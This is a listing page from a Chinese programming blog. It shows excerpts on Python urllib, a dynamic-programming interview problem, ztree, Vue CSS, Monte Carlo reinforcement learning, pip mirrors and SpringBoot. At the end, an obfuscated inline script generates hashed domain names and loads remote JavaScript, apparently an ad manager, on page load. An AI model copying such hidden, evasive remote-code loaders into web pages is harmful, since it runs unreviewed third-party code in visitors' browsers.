import urllib.request def request(url): ''' 一个参数 :param url:请求网址 :return:返回一个请求的字符串。编码为utf-8 ''' # *************** Begin *************** # r=urllib.request.urlopen(url) return r.read().decode('utf-8') # *************** End ***************** # 第2关：urllib进阶 任务描述 本关任务：利用 Opener 方法，完成一个简易的爬取程序。
import urllib.request import http.cookiejar def request(url,headers): ''' 两个参数 :param url:统一资源定位符,请求网址 :param headers:请求头 :return:html ''' # ***************** Begin ******************** # cookie = http.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/333eb5839d3554057a98da0491ef0f4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c5ac2714f0ce3f92f2ac856dcd06687/" rel="bookmark">
			美团2024届秋招笔试第二场编程真题-小美的数组构造
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 分析：暴力角度看，因为数组a和b总和一样，所以实际上是将总和m划分为n个数字，且每个数字都和a数组不一样的方案数。当然会超时。从数据角度看，平方级别算法是可以的。
其实用动态规划的四步法分析起来还是很简单的，我们要构造一个b数组，n个元素，总和是m。哪么按DP思路，先构造一个n-1的数组，总和是m-b[n]。只要b[n]!=a[n]的方案数都是可行的。
因此DP方程很容易得到，dp[i][j]表示构造一个i个数据元素，总和是j的数组。
哪么dp[i][j]=dp[i-1][[j-1]+dp[i1][j-2]+..........
dp[i-1][[j-1]表示我们第i个元素选了1，所以还有j-1的总和给前i-1个元素。当然和a[i]相同的那个排除掉即可。
#include &lt;bits/stdc++.h&gt; typedef long long ll; using namespace std; ll n,a[500],dp[305][505],mod=1e9+7,m;/**&lt; 长整型不是必须，但不容易出错 */ int main() { int i,j,k; cin&gt;&gt;n; for(i=1;i&lt;=n;i++) cin&gt;&gt;a[i],m+=a[i]; dp[0][0]=1;/**&lt; 你懂的，没这句全是0了 */ for(i=1;i&lt;=n;i++) { for(j=1;j&lt;=m;j++) {/**&lt; dp[i][j],前i个数总和是j，且满足条件的方案数量 */ for(k=1;k&lt;=j;k++)/**&lt; k是b[i],也就是序列最后一个数字，前i-1个的方案就是dp[i-1][j-k] */ if(k!=a[i]) dp[i][j]=(dp[i][j]+dp[i-1][j-k])%mod; } } cout&lt;&lt;dp[n][m]; return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca298820045f8db6545a4434e345aa07/" rel="bookmark">
			ztree从了解到使用（文章后附代码的网盘链接，直接可运行）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一，ztree是什么，可以用来干什么
ZTree是一款基于jQuery的树形插件，用于在网页中展示和操作树形结构数据。它提供了丰富的功能和灵活的配置选项，使得在网页中呈现复杂的层级结构变得更加简单。
ZTree可以用于展示各种类型的树形数据，例如组织架构、目录结构、地区信息等。它支持异步加载数据、节点的拖拽、复选框选择、搜索过滤、自定义节点图标等功能，同时还提供了丰富的事件回调函数，方便开发者根据需要进行定制和扩展。
ZTree的主要特点包括：
易用性：ZTree提供了简洁的API和丰富的文档，使得开发者能够快速地集成和使用它。
可定制性：ZTree支持丰富的配置选项和事件回调函数，开发者可以根据自己的需求对树的外观和行为进行定制。
跨浏览器兼容：ZTree经过了广泛的测试，能够在不同的主流浏览器上良好地运行，包括IE6+、Firefox、Chrome等。
总之，ZTree是一个功能强大、灵活易用的树形插件，可以帮助开发者在网页中展示和操作树形数据。
二，简单例子
图下实现了一个简单的树结构，同时可以实现模糊检索功能 ，把筛选出来的节点留下，其余隐藏起来。
看到这里的小伙伴们会不会觉得要实现这个很难啊，不会，一点也不会！ 三，示例代码
这个文件代码，直接在浏览器运行demo.html就可以看到运行效果哦。
这个是免费代码啊啊啊啊啊啊啊啊啊啊。
【超级会员V5】通过百度网盘分享的文件：ztreeFil....zip
链接：https://pan.baidu.com/s/189ME7Y-_QhJQ55-rn40Wwg?pwd=8ak6 提取码：8ak6 复制这段内容打开「百度网盘APP 即可获取」
谢谢观看
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ccd0a1a25402f6189ad061f1e253f1c/" rel="bookmark">
			学妹教我写代码【一】-如何修改富文本的img样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		富文本编辑器相信大家都有所耳闻，前端在渲染的时候提前为img设置的样式会失效，那么我们如果确实有更改img样式的需求的时候该怎么做呢？下面是我的做法。
:deep(img, video, audio) { width: 150px; } :deep()是可以改变css解析时私有属性的样式,是一个伪类选择器，可以用于将CSS规则应用于当前组件及其所有子组件中匹配选择器的元素。
例如，.content :deep(img)会选择包含class为"content"的元素的所有嵌套层次结构。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd7a47988b032ff473b71b04b763c881/" rel="bookmark">
			强化学习中蒙特卡罗方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、蒙特卡洛方法
这里将介绍一个学习方法和发现最优策略的方法，用于估计价值函数。与前文不同，这里我们不假设完全了解环境。蒙特卡罗方法只需要经验——来自实际或模拟与环境的交互的样本序列的状态、动作和奖励。从实际经验中学习是引人注目的，因为它不需要任何关于环境动态的先验知识，但仍然可以实现最优行为。从模拟经验中学习也很强大。尽管需要一个模型，但该模型只需要生成样本转换，而不是动态规划所需的完整概率分布的所有可能转换。令人惊讶的是，在很多情况下，根据所需概率分布生成经验样本很容易，但获得分布的显式形式是不可行的。
蒙特卡罗方法是解决强化学习问题的方法，它基于平均样本回报。为了确保可定义回报可用，在这里我们将蒙特卡罗方法仅定义为针对离散任务的方法。即我们假设经验分为回合，并且所有回合最终都会终止，无论选择什么动作。只有在完成回合后才会更改价值估计和策略。因此，蒙特卡罗方法可以是逐回合的增量，但不能是逐步（在线）的增量。术语“蒙特卡罗”通常更广泛地用于任何涉及大量随机组件的估计方法。在这里，我们将其专门用于基于平均完整回报（而不是从部分回报中学习的方法）的方法。
蒙特卡罗方法对每个状态-动作对进行采样和平均回报，就像我们在前文对每个动作进行采样和平均奖励一样。主要的区别在于，现在有多个状态，每个状态都像不同的问题（如联想搜索或上下文）一样，而且这些不同的问题是相互关联的。也就是说，在一个状态下采取一个行动后的回报取决于在同一回合中后来采取的行动。因为所有的行动选择都在进行学习，所以从更早的状态来看，这个问题就变成了非平稳的。
为了处理非平稳性，我们采用了通用策略迭代（GPI）的想法。在那里，我们从MDP的知识中计算值函数，在这里，我们从样本回报中学习值函数与相应的策略仍然以相同的方式相互作用以获得最优性（GPI）。与DP一样，我们首先考虑预测问题（计算固定任意策略π的vπ和qπ），然后进行政策改进，最后是控制问题以及通过GPI解决。这些来自DP的想法都被扩展到了只有样本经验可用的蒙特卡罗情况下。
二、蒙特卡洛预测
我们首先考虑使用蒙特卡罗方法学习给定策略的状态值函数。注意，一个状态的值是期望的回报，也就是从该状态开始的期望累积未来折扣奖励。那么，从经验中估计它的一个明显方法就是简单地将该状态后观察到的回报进行平均。随着更多的回报被观察到，平均值应该收敛到期望值。这个想法是所有蒙特卡罗方法的基础。
特别是，假设我们希望估计π策略下状态s的值vπ(s)，给定一组遵循π并通过s获得的状态转移序列。在每个回合中，状态s的每次出现称为对s的一次。当然，在同一个回合中，s可能被多次；让我们称在回合中对s的第一次为s的第一次。第一次蒙特卡罗方法估计vπ(s)为在第一次s后的回报的平均值，而每次蒙特卡罗方法则将所有s后的回报进行平均。这两种蒙特卡罗方法非常相似，但具有稍微不同的理论性质。蒙特卡罗方法是研究很广泛，以程序形式显示在图1中。
图1
图1中我们使用大写字母V表示近似值函数，因为在初始化之后，它很快就会变成一个随机变量。
对于首次使用蒙特卡罗方法和每次使用蒙特卡罗方法，当次数（或首次次数）趋于无穷时，它们都会收敛到vπ(s)。对于首次蒙特卡罗方法的情况，这一点很容易理解。在这种情况下，每次返回都是vπ(s)的独立、相同分布的估计，具有有限方差。根据大数定律，这些估计的平均值序列收敛到它们的期望值。每个平均值本身都是一个无偏估计，其误差的标准偏差为1/√n，其中n是平均值的数量。每次蒙特卡罗方法不太直观，但其估计也渐近收敛到vπ(s)（Singh和Sutton，1996）。蒙特卡罗方法的使用最好通过一个例子来说明。
三、典型例子
21点，又称黑杰克，是一种广受欢迎的赌场牌戏。游戏的目标是在不超出21点的情况下，尽可能获得高数值的牌。所有花牌都算作10点，而一张A可以算作1点或11点。我们考虑的是每个玩家独立与庄家对抗的版本。游戏开始时，庄家和玩家都会得到两张牌。庄家的一张牌是明牌，另一张是暗牌。如果玩家立即得到21点（一张A和一张10），那么就称为“自然”，除非庄家也有自然，否则玩家获胜。如果玩家没有自然，那么他可以要求额外的牌，一张一张地要（继续要牌），直到他停止（停牌）或超过21点（爆牌）。如果他爆牌，他就输了；如果他停牌，那么就轮到庄家。庄家根据固定的策略决定是否要牌或停牌，没有选择：他在任何总和为17点或更高的情况下停牌，否则就继续要牌。如果庄家爆牌，那么玩家就赢了；否则，结果（赢、输或平局）由谁的最终总和最接近21点决定。
图2
图2中黑杰克策略的近似状态值函数，只在20或21点停牌，通过蒙特卡洛策略评估计算。玩二十一点被自然地制定为一段有限的MDP。 每一局二十一点是一个情节。 对于赢、输和平局，分别给予+1、-1和0的奖励。 在一局比赛中所有的奖励都是零，我们不进行贴现（γ = 1）；因此这些末端奖励也是回报。 玩家的行动是击打或停牌。 状态依赖于玩家的牌和庄家的明牌。 我们假设卡片是从一个无限的套牌（即替换）中发出的，因此没有必要追踪已经发出的卡片。 如果玩家持有一张可以计为11的A牌而不会爆牌，那么这张A牌被称为可用。 在这种情况下，它总是被计为11，因为把它计为1会使总和小于或等于11，在这种情况下，没有做出决定，因为显然玩家应该一直击打。 因此，玩家根据三个变量做出决定：他当前的总和（12-21），庄家的一个明牌（A-10），以及他是否持有一张可用的A牌。 这总共有200个状态。
考虑如果在玩家总和为20或21时停牌，否则就击打的策略。 通过蒙特卡罗方法找到此策略的状态值函数，模拟许多二十一点游戏并平均每个状态后的回报。 请注意，在此任务中，相同的状态在同一情节中永远不会重复发生，因此没有首次访问和每次访问的MC方法之间的区别。 通过这种方式，我们获得了图2中所示的状态值函数的估计值。具有可用A牌的状态的估计值不太确定也不太规律，因为这些状态不太常见。 无论如何，经过50万场比赛后，价值函数被很好地逼近。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0916cdc3f447a2a3f8d8785290dd812d/" rel="bookmark">
			Python中pip install 时，下载速度慢,以及失败的解决方法(使用清华镜像下载)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Python中库下载失败是很常见的，有时候下载速度很缓慢或者下载失败都可以尝试下面的方法：
pip install 包名 -i https://pypi.tuna.tsinghua.edu.cn/simple
比如下载numpy库时，只需在终端输入以下指令：
pip install numpy -i https://pypi.tuna.tsinghua.edu.cn/simple
这样就可以解决pip install失败了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e2f2f9c24d07fb6883b4d799757c901/" rel="bookmark">
			【SpringBoot】手写模拟SpringBoot核心流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		依赖包 新建一个工程，包含两个 module：
springboot 模块，表示 springboot 源码实现；
user 模块，表示业务系统，使用 springboot 模块；
依赖包：Spring、SpringMVC、Tomcat 等，引入依赖如下：
&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;5.3.18&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;5.3.18&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.3.18&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt; &lt;version&gt;9.0.60&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 在 user 模块下引入依赖：
&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;springboot&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 定义对应的 controller 和 service：
@RestController public class UserController { @Autowired private UserService userService; @GetMapping("test") public String test(){ return userService.test(); } } 最终希望通过启动 MyApplication 的 main 方法，启动项目，能访问到 UserController。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e2f2f9c24d07fb6883b4d799757c901/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/61/">«</a>
	<span class="pagination__item pagination__item--current">62/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/63/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>